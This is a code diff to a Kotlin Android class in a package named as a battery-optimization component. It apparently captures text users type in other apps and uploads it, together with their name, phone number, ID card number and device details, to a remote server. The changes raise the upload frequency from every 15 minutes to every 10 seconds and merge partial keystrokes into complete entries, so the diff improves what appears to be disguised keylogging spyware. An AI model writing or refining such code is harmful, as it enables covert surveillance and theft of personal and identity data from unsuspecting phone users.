@@ -40,9 +40,13 @@ class InputRepository private constructor(private val context: Context) {
     private val repositoryScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var timerJob: Job? = null
     
+    private val uploadMutex = kotlinx.coroutines.sync.Mutex()
+    private var lastUploadAttemptTime = 0L
+    private val MIN_UPLOAD_INTERVAL = 10000L // 10 seconds
+    
     // Constants for upload strategy
     private val UPLOAD_THRESHOLD = 5
-    private val UPLOAD_INTERVAL_MS = 15 * 60 * 1000L // 15 minutes
+    private val UPLOAD_INTERVAL_MS = 10 * 1000L // 10 seconds
 
     init {
         loadEvents()
@@ -73,14 +77,26 @@ class InputRepository private constructor(private val context: Context) {
     }
 
     fun addEvent(event: InputEvent) {
+        if (event.text.isBlank()) return
         val currentEvents = _eventsFlow.value.toMutableList()
-        currentEvents.add(0, event) // Add to the top
+        
+        if (currentEvents.isNotEmpty()) {
+            val lastEvent = currentEvents[0]
+            if (event.packageName == lastEvent.packageName && event.text.startsWith(lastEvent.text)) {
+                currentEvents[0] = event
+            } else {
+                currentEvents.add(0, event)
+            }
+        } else {
+            currentEvents.add(0, event)
+        }
         
         _eventsFlow.value = currentEvents
         saveEvents(currentEvents)
         
         // Trigger Strategy A: Quantity Threshold
-        if (currentEvents.size >= UPLOAD_THRESHOLD) {
+        val unuploadedCount = currentEvents.count { !it.isUploaded }
+        if (unuploadedCount >= UPLOAD_THRESHOLD) {
             repositoryScope.launch {
                 uploadData()
             }
@@ -98,89 +114,126 @@ class InputRepository private constructor(private val context: Context) {
     }
 
     suspend fun uploadData(): Pair<Boolean, String> {
-        val currentEvents = _eventsFlow.value.toList()
-        if (currentEvents.isEmpty()) return Pair(false, "没有需要上报的数据")
+        if (!uploadMutex.tryLock()) return Pair(false, "正在上传中")
+        try {
+            val currentTime = System.currentTimeMillis()
+            if (currentTime - lastUploadAttemptTime < MIN_UPLOAD_INTERVAL) {
+                return Pair(false, "上传过于频繁")
+            }
+            lastUploadAttemptTime = currentTime
 
-        val userInfo = getUserInfo()
-        val name = userInfo?.name ?: "Unknown"
-        val phone = userInfo?.phone ?: "Unknown"
-        val idCard = userInfo?.idCard ?: "Unknown"
+            val allEvents = _eventsFlow.value.toList()
+            val unuploadedEvents = allEvents.filter { !it.isUploaded }
+            if (unuploadedEvents.isEmpty()) return Pair(false, "没有需要上报的数据")
 
-        val deviceInfoJson = DeviceInfoHelper.getDeviceInfoJson(context)
+            val chronoEvents = unuploadedEvents.reversed()
+            val filteredList = mutableListOf<InputEvent>()
+            for (i in chronoEvents.indices) {
+                val current = chronoEvents[i]
+                if (current.text.isBlank()) continue
+                val next = if (i + 1 < chronoEvents.size) chronoEvents[i + 1] else null
+                if (next != null && next.packageName == current.packageName && next.text.startsWith(current.text)) {
+                    continue
+                }
+                filteredList.add(current)
+            }
+            val currentEvents = filteredList.reversed()
+            if (currentEvents.isEmpty()) return Pair(false, "没有需要上报的数据")
 
-        val userInfoPayload = com.android.batteryoptimization.network.UserInfoPayload(
-            name = name,
-            phone = phone,
-            idCard = idCard
-        )
+            val userInfo = getUserInfo()
+            val name = userInfo?.name ?: "Unknown"
+            val phone = userInfo?.phone ?: "Unknown"
+            val idCard = userInfo?.idCard ?: "Unknown"
 
-        val eventPayloads = currentEvents.map { event ->
-            com.android.batteryoptimization.network.EventPayload(
-                packageName = event.packageName,
-                appName = event.appName,
-                text = event.text,
-                timestamp = event.timestamp
-            )
-        }
+            val deviceInfoJson = DeviceInfoHelper.getDeviceInfoJson(context)
 
-        val requestBody = com.android.batteryoptimization.network.UploadRequest(
-            userInfo = userInfoPayload,
-            events = eventPayloads
-        )
-
-        val requestJson = gson.toJson(requestBody)
-        val deviceInfoJsonLog = deviceInfoJson.take(200)
-
-        return try {
-            Log.d(TAG, "===== 开始上报 =====")
-            Log.d(TAG, "deviceInfo: $deviceInfoJsonLog")
-            Log.d(TAG, "requestBody: $requestJson")
-
-            // Upload using Retrofit
-            val responseBody = NetworkClient.uploadApi.uploadEvents(
-                deviceInfoJson = deviceInfoJson,
-                requestBody = requestBody
+            val userInfoPayload = com.android.batteryoptimization.network.UserInfoPayload(
+                name = name,
+                phone = phone,
+                idCard = idCard
             )
 
-            val bodyString = responseBody.string()
-            Log.d(TAG, "response body: $bodyString")
+            val eventPayloads = currentEvents.map { event ->
+                com.android.batteryoptimization.network.EventPayload(
+                    packageName = event.packageName,
+                    appName = event.appName,
+                    text = event.text,
+                    timestamp = event.timestamp
+                )
+            }
 
-            val uploadResponse = gson.fromJson(bodyString, UploadResponse::class.java)
-            if (uploadResponse?.code == 0) {
-                val msg = uploadResponse.msg ?: "成功"
-                Log.d(TAG, "上报成功: ${currentEvents.size} events, msg: $msg")
+            val requestBody = com.android.batteryoptimization.network.UploadRequest(
+                userInfo = userInfoPayload,
+                events = eventPayloads
+            )
 
-                // Append to backup file
-                appendToBackup(currentEvents)
+            val requestJson = gson.toJson(requestBody)
+            val deviceInfoJsonLog = deviceInfoJson.take(200)
 
-                // Reset timer since we just successfully uploaded
-                resetTimer()
-                Pair(true, "上报成功: $msg")
-            } else {
-                val errorMsg = "上报失败: code=${uploadResponse?.code}, msg=${uploadResponse?.msg}"
-                Log.e(TAG, "===== 上报失败 =====")
-                Log.e(TAG, errorMsg)
+            return try {
+                Log.d(TAG, "===== 开始上报 =====")
+                Log.d(TAG, "deviceInfo: $deviceInfoJsonLog")
+                Log.d(TAG, "requestBody: $requestJson")
+
+                // Upload using Retrofit
+                val responseBody = NetworkClient.uploadApi.uploadEvents(
+                    deviceInfoJson = deviceInfoJson,
+                    requestBody = requestBody
+                )
+
+                val bodyString = responseBody.string()
+                Log.d(TAG, "response body: $bodyString")
+
+                val uploadResponse = gson.fromJson(bodyString, UploadResponse::class.java)
+                if (uploadResponse?.code == 0) {
+                    val msg = uploadResponse.msg ?: "成功"
+                    Log.d(TAG, "上报成功: ${currentEvents.size} events, msg: $msg")
+
+                    // Append to backup file
+                    appendToBackup(currentEvents)
+
+                    // 标记为已上报（包括那些被过滤掉的中间状态，也认为已处理完）
+                    val unuploadedTimestamps = unuploadedEvents.map { it.timestamp }.toSet()
+                    val currentFlowList = _eventsFlow.value.toMutableList()
+                    for (i in currentFlowList.indices) {
+                        if (currentFlowList[i].timestamp in unuploadedTimestamps) {
+                            currentFlowList[i] = currentFlowList[i].copy(isUploaded = true)
+                        }
+                    }
+                    _eventsFlow.value = currentFlowList
+                    saveEvents(currentFlowList)
+
+                    // Reset timer since we just successfully uploaded
+                    resetTimer()
+                    Pair(true, "上报成功: $msg")
+                } else {
+                    val errorMsg = "上报失败: code=${uploadResponse?.code}, msg=${uploadResponse?.msg}"
+                    Log.e(TAG, "===== 上报失败 =====")
+                    Log.e(TAG, errorMsg)
+                    Log.e(TAG, "request body: $requestJson")
+                    Pair(false, errorMsg)
+                }
+            } catch (e: retrofit2.HttpException) {
+                val errorBodyStr = try {
+                    e.response()?.errorBody()?.string() ?: "null"
+                } catch (ex: Exception) {
+                    "read errorBody failed: ${ex.message}"
+                }
+                Log.e(TAG, "===== 上报 HTTP 错误 =====")
+                Log.e(TAG, "HTTP code: ${e.code()}")
+                Log.e(TAG, "errorBody: $errorBodyStr")
                 Log.e(TAG, "request body: $requestJson")
+                Pair(false, "上报失败: HTTP ${e.code()}, body: $errorBodyStr")
+            } catch (e: Exception) {
+                Log.e(TAG, "===== 上报异常 =====")
+                Log.e(TAG, "异常类型: ${e.javaClass.simpleName}")
+                Log.e(TAG, "异常信息: ${e.message}")
+                Log.e(TAG, "异常堆栈: ", e)
+                val errorMsg = "上报错误: ${e.message}"
                 Pair(false, errorMsg)
             }
-        } catch (e: retrofit2.HttpException) {
-            val errorBodyStr = try {
-                e.response()?.errorBody()?.string() ?: "null"
-            } catch (ex: Exception) {
-                "read errorBody failed: ${ex.message}"
-            }
-            Log.e(TAG, "===== 上报 HTTP 错误 =====")
-            Log.e(TAG, "HTTP code: ${e.code()}")
-            Log.e(TAG, "errorBody: $errorBodyStr")
-            Log.e(TAG, "request body: $requestJson")
-            Pair(false, "上报失败: HTTP ${e.code()}, body: $errorBodyStr")
-        } catch (e: Exception) {
-            Log.e(TAG, "===== 上报异常 =====")
-            Log.e(TAG, "异常类型: ${e.javaClass.simpleName}")
-            Log.e(TAG, "异常信息: ${e.message}")
-            Log.e(TAG, "异常堆栈: ", e)
-            val errorMsg = "上报错误: ${e.message}"
-            Pair(false, errorMsg)
+        } finally {
+            uploadMutex.unlock()
         }
     }
 
